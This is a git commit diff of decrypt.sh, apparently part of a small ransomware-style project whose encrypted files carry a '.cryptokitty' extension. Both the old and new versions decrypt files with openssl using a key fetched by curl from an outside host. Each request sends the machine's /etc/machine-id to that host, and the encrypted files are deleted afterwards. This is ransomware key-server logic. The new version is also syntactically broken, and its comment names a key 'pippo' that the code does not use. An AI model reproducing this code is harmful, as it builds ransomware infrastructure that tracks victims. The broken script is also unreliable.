34b69255283f7b483c6cb5e5226e974e9cfe042b
Solomon Marian <blasco991@gmail.com>
2018-07-07 13:39:30 +0200

    Update decrypt.sh
    file parameter

--- decrypt.sh
+++ decrypt.sh
@@ -1,9 +1,7 @@
-#for every file in the chosen directory
-for f in $(find /home/cavaz/prova -type f -name '*.cryptokitty'); do
-echo $f
-#i decrypt the files with extension .criptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
-[ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$target)\" -out ${f%.cryptokitty} ; rm $f
-
-done
-
-
+#file in the first argument
+if [[ "${f##*\\.}" == "*.cryptokitty" ]] then
+$f = ${$1%.cryptokitty}
+echo $f 
+#i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
+[ -f $f ] && [[  ]] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out ${f%.cryptokitty} ; rm $f
+fi
